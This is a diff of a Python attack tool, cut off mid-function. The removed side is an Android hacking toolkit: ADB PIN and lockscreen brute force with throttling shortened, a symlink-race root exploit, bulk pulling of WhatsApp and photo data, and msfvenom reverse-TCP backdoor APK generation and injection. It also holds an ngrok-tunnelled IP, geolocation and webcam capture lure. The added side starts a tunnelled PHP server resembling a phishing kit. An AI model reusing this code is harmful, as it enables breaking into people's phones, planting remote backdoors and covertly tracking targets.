@@ -1,658 +1,729 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-import os, sys, subprocess, time, re, platform, shutil, signal
+import os
+import sys
+import time
+import re
+import shutil
+import signal
+import subprocess
+import platform
+import urllib.request
+import urllib.error
+import json
+import tarfile
+import zipfile
 from pathlib import Path
-from datetime import datetime
+from typing import Optional
 
-# ------------------------------ Colors ------------------------------
-class c:
-    m   = "\033[0;31m"      # red
-    k   = "\033[0;33m"      # yellow
-    h   = "\033[0;32m"      # green
-    b   = "\033[0;34m"      # blue
-    lm  = "\033[1;31m"      # pink
-    lk  = "\033[1;33m"      # bright yellow
-    lh  = "\033[1;32m"      # light green
-    lb  = "\033[1;34m"      # light blue
-    n   = "\033[0m"         # neutral
-    w   = "\033[1;37m"      # thick white
+## DEFAULT HOST & PORT
+HOST: str = '127.0.0.1'
+PORT: str = '8080'
 
-# -------------------------- Paths & Globals -------------------------
-SCRIPT_DIR = Path(__file__).parent.resolve()
-FILES_DIR  = SCRIPT_DIR / "Files"
-BACKDOOR_DIR = SCRIPT_DIR / "backdoor"
-INFO_DIR   = SCRIPT_DIR / "info"
-CAM_DIR    = SCRIPT_DIR / "cam"
+## ANSI colours (original scheme)
+RED = "\033[31m"
+GREEN = "\033[32m"
+ORANGE = "\033[33m"
+BLUE = "\033[34m"
+MAGENTA = "\033[35m"
+CYAN = "\033[36m"
+WHITE = "\033[37m"
+BLACK = "\033[30m"
+REDBG = "\033[41m"
+GREENBG = "\033[42m"
+ORANGEBG = "\033[43m"
+BLUEBG = "\033[44m"
+MAGENTABG = "\033[45m"
+CYANBG = "\033[46m"
+WHITEBG = "\033[47m"
+BLACKBG = "\033[40m"
+RESETBG = "\033[0m\n"
 
-# ------------------------- New Banner (nexu) ------------------------
-def show():
-    YELLOW = "\033[93m"
-    BLUE = "\033[94m"
-    GREEN = "\033[92m"
-    RESET = "\033[0m"
-    BOLD = "\033[1m"
+BOLD = "\033[1m"
+RESET = "\033[0m"
 
-    # nexu logo
-    print(f"{BLUE}{BOLD}")
-    print("  ███╗   ██╗███████╗██╗  ██╗██╗   ██╗")
-    print("  ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║")
-    print("  ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║")
-    print("  ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║")
-    print("  ██║ ╚████║███████╗██╔╝ ╚██╗╚██████╔╝")
-    print("  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ")
-    print(RESET)
+## Directories
+BASE_DIR = Path(__file__).resolve().parent
 
-    # penguin
-    print(f"{GREEN}{BOLD}")
-    print("        .--.")
-    print("       |o_o |")
-    print("       |:_/ |")
-    print("      //   \\ \\")
-    print("     (|     | )")
-    print("    /'\\   /`\\")
-    print("    \\)=(/")
-    print(RESET)
+def ensure_dirs() -> None:
+    (BASE_DIR / ".server").mkdir(exist_ok=True)
+    (BASE_DIR / "auth").mkdir(exist_ok=True)
+    www = BASE_DIR / ".server" / "www"
+    if www.exists():
+        shutil.rmtree(www)
+    www.mkdir(parents=True, exist_ok=True)
+    for logf in [".server/.loclx", ".server/.cld.log"]:
+        p = BASE_DIR / logf
+        if p.exists():
+            p.unlink()
 
-    # developer
-    print(f"{YELLOW}{BOLD}")
-    print("     Developed by: zaazouamouad")
-    print(RESET)
+ensure_dirs()
 
-def banner():
-    show()
-    print(f"{c.lb}Android/IOS Hacking Toolkit{c.n}\n")
+def reset_color() -> None:
+    sys.stdout.write(RESET)
+    sys.stdout.flush()
 
-# ------------------------- Root Check -------------------------------
-def check_root():
-    if os.geteuid() != 0:
-        print(f"{c.m}You must be root to run the script{c.n}")
-        sys.exit(1)
-
-# ------------------------- Utility Functions ------------------------
-def run(cmd, shell=True, check=False):
-    return subprocess.run(cmd, shell=shell, capture_output=True, text=True)
-
-def run_out(cmd):
-    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout.strip()
-
-def is_tool(name):
-    return shutil.which(name) is not None
-
-def clear():
-    os.system("clear")
-
-def wait_for_device():
-    print(f"{c.lh}[*] Waiting for device...{c.n}")
-    run("adb wait-for-device")
-
-# --------------------------- OS Detect ------------------------------
-def detect_os():
-    banner()
-    print(f"{c.m}        Detect Your OS {c.n}")
-    time.sleep(0.5)
-    print("Kernel:", platform.uname().system)
-    time.sleep(0.5)
-    dist = run_out("lsb_release -i 2>/dev/null || echo Unknown")
-    print(dist)
-    codename = run_out("lsb_release -c 2>/dev/null || echo Unknown")
-    print(codename)
-    time.sleep(0.5)
-    ip = run_out("ip addr show | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'")
-    print(f"Your IP Address: {ip}")
-    time.sleep(2)
-    clear()
-
-# ------------------------ Detect Config -----------------------------
-def detect_config():
-    banner()
-    print(f"{c.m}    Detect Installed Package {c.n}")
-    print("   Checking ADB, Metasploit, APKTool...")
-    time.sleep(1)
-    required = ["adb", "msfvenom", "msfconsole", "apktool", "scrcpy", "php", "curl"]
-    for tool in required:
-        status = f"{c.lh}Found{c.n}" if is_tool(tool) else f"{c.m}Missing{c.n}"
-        print(f"   {tool}: {status}")
-    print(f"\n{c.k}[!] For full functionality install missing tools{c.n}")
-    time.sleep(1)
-    clear()
-
-# ----------------------------- Main Menu ---------------------------
-def main_menu():
-    while True:
-        clear()
-        banner()
-        # Menu in bright yellow
-        print(f"""{c.lk}
-  1. Update
-  2. Brute Pin 4 Digit
-  3. Brute Pin 6 Digit
-  4. Brute LockScreen Using Wordlist
-  5. Bypass LockScreen (Antiguard)
-  6. Root Android (Supersu)
-  7. ADB Toolkit
-  8. Reset Data
-  9. Remove LockScreen (Root)
- 10. Metasploit Backdoor
- 11. Control Android (Scrcpy)
- 12. Phone Info
- 13. IP Logger (Over Internet)
- 14. Get WebCam (Over Internet)
- 15. FireStore Vulnerability Scan
- 99. Exit
-{c.n}""")
-        choice = input("senpai@nexu:~# ").strip()
-        if choice == "1": update()
-        elif choice == "2": brute_pin4()
-        elif choice == "3": brute_pin6()
-        elif choice == "4": brute_wordlist()
-        elif choice == "5": bypass_antiguard()
-        elif choice == "6": root_supersu()
-        elif choice == "7": adb_toolkit()
-        elif choice == "8": reset_data()
-        elif choice == "9": remove_lock_root()
-        elif choice == "10": metasploit_menu()
-        elif choice == "11": control_scrcpy()
-        elif choice == "12": phone_info()
-        elif choice == "13": ip_logger()
-        elif choice == "14": get_webcam()
-        elif choice == "15": firestore_scan()
-        elif choice == "99":
-            print("Goodbye!")
-            sys.exit(0)
-        else:
-            print(f"{c.m}Invalid option!{c.n}")
-            time.sleep(2)
-
-# --------------------------- 1. Update ------------------------------
-def update():
-    print("Updating nexu...")
-    base = "https://raw.githubusercontent.com/tegal1337/CiLocks/main"
-    try:
-        run(f"wget {base}/cilocks -O {SCRIPT_DIR}/cilocks")
-        run(f"wget {base}/data/config -O {SCRIPT_DIR}/data/config")
-        run(f"wget {base}/data/os -O {SCRIPT_DIR}/data/os")
-        os.chmod(SCRIPT_DIR / "cilocks", 0o755)
-        print("Update done. Restart the script.")
-        sys.exit(0)
-    except Exception as e:
-        print(f"{c.m}Update failed: {e}{c.n}")
-
-# ---------------------------- 2. Brute 4 ----------------------------
-def brute_pin4():
-    wait_for_device()
-    run("adb shell input keyevent 26")
-    run("adb shell input keyevent 82")
-    print("Brute Pin 4 Digit")
-    for i in range(10000):
-        pin = f"{i:04d}"
-        print(f"Try => {pin}", end="\r")
-        for digit in pin:
-            run(f"adb shell input keyevent {int(digit)+7}")
-        run("adb shell input keyevent 66")
-        if (i+1) % 5 == 0:
-            print("Delay 2s")
-            time.sleep(2)			# changed from 30s to 2s
-            run("adb shell input keyevent 82")
-            run("adb shell input swipe 407 1211 378 85")
-
-# ---------------------------- 3. Brute 6 ----------------------------
-def brute_pin6():
-    wait_for_device()
-    run("adb shell input keyevent 26")
-    run("adb shell input keyevent 82")
-    print("Brute Pin 6 Digit")
-    for i in range(1000000):
-        pin = f"{i:06d}"
-        print(f"Try => {pin}", end="\r")
-        for digit in pin:
-            run(f"adb shell input keyevent {int(digit)+7}")
-        run("adb shell input keyevent 66")
-        if (i+1) % 5 == 0:
-            print("Delay 2s")
-            time.sleep(2)			# changed from 30s to 2s
-            run("adb shell input keyevent 82")
-            run("adb shell input swipe 407 1211 378 85")
-
-# ---------------------------- 4. Wordlist ---------------------------
-def brute_wordlist():
-    wait_for_device()
-    run("adb shell input keyevent 26")
-    run("adb shell input keyevent 82")
-    file_path = input("Wordlist path: ").strip()
-    if not Path(file_path).exists():
-        print(f"{c.m}File not found!{c.n}")
-        return
-    with open(file_path, "r") as f:
-        words = [line.strip() for line in f if line.strip()]
-    for idx, word in enumerate(words, 1):
-        print(f"Try => {word}")
-        for ch in word:
-            # using input text for each character (may need refinement)
-            run(f"adb shell input text {ch}")
-        run("adb shell input keyevent 66")
-        if idx % 5 == 0:
-            print("Delay 2s")
-            time.sleep(2)			# changed from 30s to 2s
-            run("adb shell input keyevent 82")
-            run("adb shell input swipe 407 1211 378 85")
-
-# --------------------------- 5. AntiGuard ---------------------------
-def bypass_antiguard():
-    pkg = "io.kos.antiguard"
-    res = run(f"adb shell pm list packages | grep {pkg}")
-    if res.returncode == 0:
-        run(f"adb uninstall {pkg}")
-    else:
-        apk = SCRIPT_DIR / "AntiGuard" / "AntiGuard.apk"
-        if not apk.exists():
-            print(f"{c.m}AntiGuard.apk not found!{c.n}")
-            return
-        run(f"adb install {apk}")
-        run(f"adb shell am start {pkg}/.unlock")
-
-# --------------------------- 6. Supersu Root ------------------------
-def root_supersu():
-    modules_dir = SCRIPT_DIR / "modules"
-    if not (modules_dir / "fakebackup.ab").exists():
-        print(f"{c.m}Required modules not found!{c.n}")
-        return
-    wait_for_device()
-    run(f"adb restore {modules_dir}/fakebackup.ab")
-    print("Exploiting...")
-    run('adb shell "while ! ln -s /data/local.prop /data/data/com.android.settings/a/file99 2>/dev/null; do :; done; echo Overwrote local.prop!"')
-    check = run_out("adb shell cat /data/local.prop")
-    if check:
-        print("Rooted! Rebooting...")
-        run("adb reboot")
-        time.sleep(2)
-        wait_for_device()
-        run("adb shell mount -o rw,remount /system")
-        run(f"adb push {modules_dir}/su-static /system/xbin/su")
-        run("adb shell /data/local/tmp/busybox chown 0:0 /system/xbin/su")
-        run("adb shell /data/local/tmp/busybox chmod 6777 /system/xbin/su")
-        run(f"adb push {modules_dir}/Superuser.apk /system/app/")
-        run("adb shell rm /data/local.prop")
-        run("adb reboot")
-        print("Supersu installed.")
-    else:
-        print(f"{c.m}Root failed.{c.n}")
-
-# --------------------------- 7. ADB Toolkit -------------------------
-def adb_toolkit():
-    while True:
-        clear()
-        banner()
-        print(f"{c.m}           ADB Toolkit{c.n}\n")
-        print(f"""{c.lk}
- 1. Shell
- 2. Screenshot
- 3. Pull DCIM
- 4. Pull WhatsApp
- 5. Pull /sdcard
- 6. Custom pull
- 7. Backup (ab)
- 8. Restore (ab)
- 9. Reset permissions
-10. Reboot
-99. Main Menu
-{c.n}""")
-        sel = input("senpai@nexu:~# ").strip()
-        if sel == "1":
-            os.system("adb shell")
-        elif sel == "2":
-            name = f"screenshot-{datetime.now().strftime('%H%M%S')}.png"
-            dest = FILES_DIR / "Screenshot"
-            dest.mkdir(parents=True, exist_ok=True)
-            run(f"adb exec-out screencap -p > {dest/name}")
-            print(f"Saved: {dest/name}")
-        elif sel == "3":
-            dest = FILES_DIR / f"DCIM-{datetime.now().strftime('%H%M%S')}"
-            run(f"adb pull /sdcard/DCIM/ {dest}")
-            print(f"Saved: {dest}")
-        elif sel == "4":
-            dest = FILES_DIR / f"WhatsApp-{datetime.now().strftime('%H%M%S')}"
-            run(f"adb pull /sdcard/WhatsApp/ {dest}")
-            print(f"Saved: {dest}")
-        elif sel == "5":
-            dest = FILES_DIR / f"sdcard-{datetime.now().strftime('%H%M%S')}"
-            run(f"adb pull /sdcard/ {dest}")
-            print(f"Saved: {dest}")
-        elif sel == "6":
-            src = input("Source path: ").strip()
-            folder = input("Folder name: ").strip()
-            dest = FILES_DIR / folder
-            run(f"adb pull {src} {dest}")
-            print(f"Saved: {dest}")
-        elif sel == "7":
-            backup_folder = SCRIPT_DIR / "backup"
-            backup_folder.mkdir(exist_ok=True)
-            run(f"adb backup -apk -shared -all -f {backup_folder}/backup.ab")
-        elif sel == "8":
-            backup_file = SCRIPT_DIR / "backup" / "backup.ab"
-            if backup_file.exists():
-                run(f"adb restore {backup_file}")
-            else:
-                print("backup.ab not found")
-        elif sel == "9":
-            run("adb shell pm reset-permissions")
-        elif sel == "10":
-            run("adb reboot")
-        elif sel == "99":
-            break
-        else:
-            print(f"{c.m}Invalid{c.n}")
-        input("Press Enter...")
-
-# --------------------------- 8. Reset Data --------------------------
-def reset_data():
-    print(f"{c.lk}1. Fastboot\n2. Recovery{c.n}")
-    o = input("senpai@nexu:~# ").strip()
-    if o == "1":
-        run("adb reboot bootloader")
-        time.sleep(5)
-        run("fastboot erase userdata")
-        run("fastboot erase cache")
-    elif o == "2":
-        run("adb shell recovery --wipe_data")
-    else:
-        print(f"{c.m}Invalid{c.n}")
-
-# ------------------------ 9. Remove Lock (Root) ---------------------
-def remove_lock_root():
-    wait_for_device()
-    run("adb shell su -c 'rm /data/system/*.key'")
-    run("adb reboot")
-    print("Done.")
-
-# ------------------------- 10. Metasploit ---------------------------
-def metasploit_menu():
-    while True:
-        clear()
-        banner()
-        print(f"{c.m}   Metasploit Backdoor Generator{c.n}\n")
-        print(f"""{c.lk}
- 1. Install APK to device
- 2. Create Payload Backdoor (msfvenom) Signed
- 3. Start Metasploit Listener
- 4. Inject Payload in Original APK
-99. Main Menu
-{c.n}""")
-        c_ = input("senpai@nexu:~# ").strip()
-        if c_ == "1":
-            apk = input("APK path: ").strip()
-            run_app = input("Run after install? (y/n): ").strip().lower()
-            run(f"adb install {apk}")
-            if run_app == "y":
-                pkg = input("Package name: ").strip()
-                run(f"adb shell am start {pkg}/.unlock")
-        elif c_ == "2":
-            host = input("LHOST: ").strip()
-            port = input("LPORT: ").strip()
-            app_name = input("App name (without .apk): ").strip()
-            BACKDOOR_DIR.mkdir(exist_ok=True)
-            raw = BACKDOOR_DIR / "loli.apk"
-            print(f"{c.lb}Creating payload...{c.n}")
-            run(f"msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} R> {raw}")
-            print("Signing...")
-            keystore = BACKDOOR_DIR / "key.keystore"
-            run(f"keytool -genkey -V -keystore {keystore} -alias hacked -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname 'CN=Unknown'")
-            run(f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore} -storepass android {raw} hacked")
-            run(f"jarsigner -verify -verbose {raw}")
-            final = BACKDOOR_DIR / f"{app_name}.apk"
-            run(f"zipalign -v 4 {raw} {final}")
-            raw.unlink()
-            keystore.unlink()
-            print(f"Backdoor: {final}")
-        elif c_ == "3":
-            clear(); banner()
-            host = input("LHOST: ").strip()
-            port = input("LPORT: ").strip()
-            print(f"{c.lk}Choose payload:{c.n}")
-            print("1. android/meterpreter/reverse_tcp")
-            print("2. osx/armle/execute/reverse_tcp")
-            pch = input("> ").strip()
-            if pch == "1":
-                payload = "android/meterpreter/reverse_tcp"
-            elif pch == "2":
-                payload = "osx/armle/execute/reverse_tcp"
-            else:
-                return
-            print(f"{c.lk}Listener options:{c.n}")
-            print("1. multi/handler")
-            print("2. post/android/manage/remove_lock")
-            print("3. post/android/manage/remove_lock_root")
-            print("4. apple_ios/safari_jit")
-            exp = input("> ").strip()
-            exploits = {
-                "1": "use exploit/multi/handler",
-                "2": "use post/android/manage/remove_lock",
-                "3": "use post/android/manage/remove_lock_root",
-                "4": "use exploit/apple_ios/browser/safari_jit"
-            }
-            if exp in exploits:
-                cmd = f"msfconsole -x '{exploits[exp]}; set PAYLOAD {payload}; set LHOST {host}; set LPORT {port}; exploit'"
-                if is_tool("xterm"):
-                    subprocess.Popen(["xterm", "-T", "nexu Exploit", "-geometry", "100x35", "-e", cmd])
-                else:
-                    os.system(cmd)
-        elif c_ == "4":
-            host = input("LHOST: ").strip()
-            port = input("LPORT: ").strip()
-            original = input("Original APK: ").strip()
-            app_name = input("Output APK name: ").strip()
-            BACKDOOR_DIR.mkdir(exist_ok=True)
-            out = BACKDOOR_DIR / "loli.apk"
-            run(f"msfvenom --platform android -x {original} -p android/meterpreter/reverse_tcp lhost={host} lport={port} -o {out}")
-            final = BACKDOOR_DIR / f"{app_name}.apk"
-            out.rename(final)
-            print(f"Backdoor: {final}")
-        elif c_ == "99":
-            break
-        else:
-            print(f"{c.m}Invalid{c.n}")
-        input("Press Enter...")
-
-# ------------------------ 11. Scrcpy -------------------------------
-def control_scrcpy():
-    if is_tool("scrcpy"):
-        os.system("scrcpy")
-    else:
-        print(f"{c.m}Install scrcpy first: apt install scrcpy{c.n}")
-
-# ------------------------ 12. Phone Info ----------------------------
-def phone_info():
-    wait_for_device()
-    manufact = run_out("adb shell getprop ro.product.manufacturer")
-    model = run_out("adb shell getprop ro.product.model")
-    version = run_out("adb shell getprop ro.build.version.release")
-    sdk = run_out("adb shell getprop ro.build.version.sdk")
-    print(f"Device: {manufact} {model} (Android {version}, API {sdk})")
-
-# ------------------------ 13. IP Logger -----------------------------
-def ip_logger():
-    clear(); banner()
-    print(f"{c.m}   IP Logger (Over Internet){c.n}\n")
-    check_tools_php_curl()
-    INFO_DIR.mkdir(exist_ok=True)
-    ngrok_path = ensure_ngrok()
-    php_proc = subprocess.Popen(["php", "-S", "127.0.0.1:3333", "-t", str(INFO_DIR)],
-                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(2)
-    ngrok_proc = subprocess.Popen([str(ngrok_path), "http", "3333"],
-                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(5)
-    try:
-        import requests
-        tun = requests.get("http://127.0.0.1:4040/api/tunnels").json()
-        url = tun["tunnels"][0]["public_url"]
-        print(f"{c.lb}[*] Send link: {c.n}{url}")
-    except:
-        print("Ngrok API not accessible.")
-        php_proc.terminate(); ngrok_proc.terminate(); return
-
-    print(f"\n{c.lk}[*] Waiting for target... Ctrl+C to abort{c.n}")
-    try:
-        while True:
-            if (INFO_DIR / "ip.txt").exists():
-                with open(INFO_DIR / "ip.txt") as f: data = f.read()
-                ip = re.search(r"IP:\s*(\S+)", data)
-                ua = re.search(r"User-Agent:\s*(.+)", data)
-                if ip: print(f"{c.lk}IP: {ip.group(1)}")
-                if ua: print(f"{c.lk}UA: {ua.group(1)}")
-                save_data = SCRIPT_DIR / "saved.ip.txt"
-                with open(save_data, "a") as sf: sf.write(data)
-                os.remove(INFO_DIR / "ip.txt")
-                print(f"{c.lk}Waiting for geolocation...{c.n}")
-                while not (INFO_DIR / "geolocate.txt").exists():
-                    time.sleep(1)
-                with open(INFO_DIR / "geolocate.txt") as gf: gdata = gf.read()
-                lat = re.search(r"Latitude:\s*([\d.-]+)", gdata)
-                lon = re.search(r"Longitude:\s*([\d.-]+)", gdata)
-                if lat and lon:
-                    print(f"Location: {lat.group(1)}, {lon.group(1)}")
-                    print(f"Google Maps: https://maps.google.com/?q={lat.group(1)},{lon.group(1)}")
-                save_geo = SCRIPT_DIR / "saved.geolocate.txt"
-                with open(save_geo, "a") as sf: sf.write(gdata)
-                os.remove(INFO_DIR / "geolocate.txt")
-                break
-            time.sleep(0.5)
-    except KeyboardInterrupt:
-        pass
-    finally:
-        php_proc.terminate(); ngrok_proc.terminate()
-
-# ------------------------ 14. Get WebCam ----------------------------
-def get_webcam():
-    clear(); banner()
-    print(f"{c.m}   Get WebCam (Over Internet){c.n}\n")
-    check_tools_php_curl()
-    CAM_DIR.mkdir(exist_ok=True)
-    ngrok_path = ensure_ngrok()
-    php_proc = subprocess.Popen(["php", "-S", "127.0.0.1:3333", "-t", str(CAM_DIR)],
-                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(2)
-    ngrok_proc = subprocess.Popen([str(ngrok_path), "http", "3333"],
-                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(5)
-    try:
-        import requests
-        tun = requests.get("http://127.0.0.1:4040/api/tunnels").json()
-        url = tun["tunnels"][0]["public_url"]
-        print(f"{c.lb}[*] Link: {c.n}{url}")
-    except:
-        print("Ngrok issue")
-        php_proc.terminate(); ngrok_proc.terminate(); return
-
-    print(f"{c.lk}[*] Waiting for image... Ctrl+C to exit{c.n}")
-    try:
-        while True:
-            found = any(Path(CAM_DIR).glob("*.png")) or any(Path(CAM_DIR).glob("*.jpg"))
-            if found:
-                print(f"{c.m}[*] Image saved in {CAM_DIR}{c.n}")
-                break
-            time.sleep(1)
-    except KeyboardInterrupt:
-        pass
-    finally:
-        php_proc.terminate(); ngrok_proc.terminate()
-
-# ------------------------ 15. Firestore Scan ------------------------
-def firestore_scan():
-    clear(); banner()
-    print(f"{c.m}   FireStore Vulnerability Scanner{c.n}\n")
-    apk = input("APK file path: ").strip()
-    if not apk.endswith(".apk"):
-        print(f"{c.m}[!] Must be .apk{c.n}")
-        return
-    if not is_tool("apktool"):
-        print(f"{c.m}apktool not found{c.n}")
-        return
-    base = Path(apk).stem
-    out_dir = f"fsp-{base}"
-    print(f"{c.k}[*] Decompiling {apk}...{c.n}")
-    run(f"apktool d {apk} -o {out_dir}")
-    manifest = Path(out_dir) / "AndroidManifest.xml"
-    if not manifest.exists():
-        print(f"{c.m}Manifest missing{c.n}")
-        shutil.rmtree(out_dir, ignore_errors=True)
-        return
-    with open(manifest, "r", errors="ignore") as m:
-        if "firebase" not in m.read().lower():
-            print(f"{c.m}Firebase not found{c.n}")
-            shutil.rmtree(out_dir, ignore_errors=True)
-            return
-    print(f"{c.lk}[+] Firebase detected{c.n}")
-    strings_xml = Path(out_dir) / "res" / "values" / "strings.xml"
-    project_id = None
-    if strings_xml.exists():
-        with open(strings_xml, "r", errors="ignore") as s:
-            for line in s:
-                m = re.search(r'<string name="project_id">(.*?)</string>', line)
-                if m:
-                    project_id = m.group(1)
-                    break
-    if project_id:
-        print(f"{c.lk}[+] Project ID: {project_id}{c.n}")
-    match_str = "Lcom/google/firebase/firestore/FirebaseFirestore"
-    collections = set()
-    for smali in Path(out_dir).rglob("*.smali"):
-        with open(smali, "r", errors="ignore") as sf:
-            lines = sf.readlines()
-        for i, line in enumerate(lines):
-            if match_str in line:
-                for j in range(i+1, min(i+5, len(lines))):
-                    const_match = re.search(r'const-string\s+\S+,\s*"([^"]*)"', lines[j])
-                    if const_match:
-                        collections.add(const_match.group(1))
-                        break
-    if collections:
-        print(f"{c.lk}[+] Collections ({len(collections)}):{c.n}")
-        for col in sorted(collections):
-            print(f"  {col}")
-    else:
-        print(f"{c.m}[-] No collections found{c.n}")
-    shutil.rmtree(out_dir, ignore_errors=True)
-    print(f"{c.k}[!] Warning: Accessing collections may incur costs{c.n}")
-
-# ------------------------- Helper functions -------------------------
-def check_tools_php_curl():
-    if not is_tool("php") or not is_tool("curl"):
-        print(f"{c.m}PHP and curl required. Install with: apt install php curl{c.n}")
-        sys.exit(1)
-
-def ensure_ngrok():
-    ngrok_path = SCRIPT_DIR / "ngrok"
-    if ngrok_path.exists():
-        return ngrok_path
-    print(f"{c.k}[*] Downloading ngrok...{c.n}")
-    arch = platform.machine()
-    if "arm" in arch.lower() or "aarch" in arch.lower():
-        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
-    else:
-        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
-    import urllib.request
-    urllib.request.urlretrieve(url, "ngrok.zip")
-    import zipfile
-    with zipfile.ZipFile("ngrok.zip", "r") as z:
-        z.extractall(SCRIPT_DIR)
-    os.remove("ngrok.zip")
-    os.chmod(ngrok_path, 0o755)
-    return ngrok_path
-
-# ------------------------- SIGINT Handler ---------------------------
-def sig_handler(sig, frame):
-    print(f"\n{c.k}Interrupted.{c.n}")
+def exit_on_signal_SIGINT(signum, frame) -> None:
+    print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Interrupted.")
+    reset_color()
     sys.exit(0)
 
-# ------------------------------- Main -------------------------------
-if __name__ == "__main__":
-    signal.signal(signal.SIGINT, sig_handler)
-    check_root()
-    detect_os()
-    detect_config()
+def exit_on_signal_SIGTERM(signum, frame) -> None:
+    print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Terminated.")
+    reset_color()
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, exit_on_signal_SIGINT)
+signal.signal(signal.SIGTERM, exit_on_signal_SIGTERM)
+
+def kill_pid() -> None:
+    for process in ["php", "cloudflared", "loclx"]:
+        try:
+            subprocess.run(["killall", process], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
+
+# ────────────────────────── Banners (original colours) ─────────────────────
+def show() -> None:
+    print(f"{GREEN}{BOLD}")
+    print("  ███╗   ██╗███████╗██╗      ██╗      ██╗  ██╗")
+    print("  ████╗  ██║██╔════╝██║      ██║      ╚██╗██╔╝")
+    print("  ██╔██╗ ██║█████╗  ██║      ██║       ╚███╔╝ ")
+    print("  ██║╚██╗██║██╔══╝  ██║      ██║       ██╔██╗ ")
+    print("  ██║ ╚████║███████╗███████╗ ███████╗ ██╔╝ ██╗")
+    print("  ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚══════╝ ╚═╝  ╚═╝")
+    print(RESET)
+
+    print(f"{GREEN}{BOLD}")
+    print("        \\_______/          ")
+    print("    `.  /       \\ .'       ")
+    print("      `-| () () |-'        ")
+    print("       /  /\\_/\\  \\         ")
+    print("      /  /  |  \\  \\        ")
+    print("     ( >/   |   \\< )       ")
+    print(f"      >{ORANGE}=={RED}>>{ORANGE}>>{RED}>>{ORANGE}>>{RED}>>>>{ORANGE}~{RED}~~{ORANGE}~~~~~{RESET}")
+    print(f"{GREEN}{BOLD}     ( >/   |   \\< )       ")
+    print("      \\  \\ _|_ /  /        ")
+    print("       \\__|   |__/         ")
+    print("       /  |   |  \\         ")
+    print("      /   |   |   \\        ")
+    print("    _/    |   |    \\_      ")
+    print("   / \\____|   |____/ \\     ")
+    print("  /       \\___|      \\     ")
+    print(RESET)
+
+    print(f"{ORANGE}{BOLD}")
+    print("          Developed by: zaazouamouad")
+    print(RESET)
+
+def banner_small() -> None:
+    print(f"""
+{BLUE}  ███╗   ██╗███████╗██╗      ██╗      ██╗  ██╗
+{BLUE}  ████╗  ██║██╔════╝██║      ██║      ╚██╗██╔╝
+{BLUE}  ██╔██╗ ██║█████╗  ██║      ██║       ╚███╔╝
+{BLUE}  ██║╚██╗██║██╔══╝  ██║      ██║       ██╔██╗
+{BLUE}  ██║ ╚████║███████╗███████╗ ███████╗ ██╔╝ ██╗
+{BLUE}  ╚═╝  ╚═══╝╚══════╝╚══════╝ ╚══════╝ ╚═╝  ╚═╝{WHITE}
+    """)
+
+# ────────────────── Internet & Dependencies ─────────────────────
+def check_status() -> None:
+    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Internet Status : ", end="")
     try:
+        urllib.request.urlopen("https://api.github.com", timeout=3)
+        print(f"{GREEN}Online{WHITE}")
+    except Exception:
+        print(f"{RED}Offline{WHITE}")
+
+def dependencies() -> None:
+    print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing required packages...")
+    termux_home = "/data/data/com.termux/files/home"
+    if os.path.isdir(termux_home):
+        if not shutil.which("proot"):
+            print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing package : {ORANGE}proot{CYAN}")
+            subprocess.run(["pkg", "install", "proot", "resolv-conf", "-y"], check=False)
+        if not shutil.which("tput"):
+            print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing package : {ORANGE}ncurses-utils{CYAN}")
+            subprocess.run(["pkg", "install", "ncurses-utils", "-y"], check=False)
+
+    required = ["php", "curl", "unzip"]
+    missing = [p for p in required if not shutil.which(p)]
+    if not missing:
+        print(f"\n{GREEN}[{WHITE}+{GREEN}]{GREEN} Packages already installed.")
+        return
+
+    for pkg in missing:
+        print(f"\n{GREEN}[{WHITE}+{GREEN}]{CYAN} Installing package : {ORANGE}{pkg}{CYAN}")
+        if shutil.which("pkg"):
+            subprocess.run(["pkg", "install", pkg, "-y"], check=False)
+        elif shutil.which("apt"):
+            subprocess.run(["sudo", "apt", "install", pkg, "-y"], check=False)
+        elif shutil.which("apt-get"):
+            subprocess.run(["sudo", "apt-get", "install", pkg, "-y"], check=False)
+        elif shutil.which("pacman"):
+            subprocess.run(["sudo", "pacman", "-S", pkg, "--noconfirm"], check=False)
+        elif shutil.which("dnf"):
+            subprocess.run(["sudo", "dnf", "-y", "install", pkg], check=False)
+        elif shutil.which("yum"):
+            subprocess.run(["sudo", "yum", "-y", "install", pkg], check=False)
+        else:
+            print(f"\n{RED}[{WHITE}!{RED}]{RED} Unsupported package manager, install packages manually.")
+            reset_color()
+            sys.exit(1)
+
+# ────────────────── binary download (safe, non‑fatal) ─────────
+def download(url: str, output: str) -> bool:
+    file_name = os.path.basename(url)
+    dest_file = BASE_DIR / file_name
+    dest_output = BASE_DIR / ".server" / output
+    if dest_file.exists():
+        dest_file.unlink()
+    if dest_output.exists():
+        dest_output.unlink()
+    try:
+        urllib.request.urlretrieve(url, dest_file)
+    except Exception:
+        return False
+    try:
+        if dest_file.suffix == ".zip":
+            with zipfile.ZipFile(dest_file, 'r') as zf:
+                zf.extractall(BASE_DIR / ".server")
+            extracted = BASE_DIR / ".server" / output
+            if not extracted.exists():
+                for f in zf.namelist():
